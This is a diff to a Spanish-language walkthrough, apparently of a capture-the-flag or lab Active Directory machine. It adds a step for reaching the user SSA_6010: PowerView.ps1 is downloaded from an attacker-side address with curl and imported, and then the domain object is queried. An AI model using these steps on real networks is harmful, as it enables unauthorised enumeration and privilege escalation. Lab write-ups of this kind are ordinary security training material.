@@ -272,4 +272,11 @@ usamos las credenciales que hemos obtenido con el usuario y vamos a ingresar con
 
 ### acceso a SSA_6010
 nuestro último objetivo es obtener acceso al usuario `SSA_6010` para esto usaremos nuevamente PowerView.ps1
+
+```python
+curl 10.10.14.2:80/PowerView.ps1 -o PowerView.ps1
+Import-Module .\PowerView.ps1
+Get-DomainObject -Identity SSA_6010
+```
+
 ![[Pasted image 20240707011706.png]]
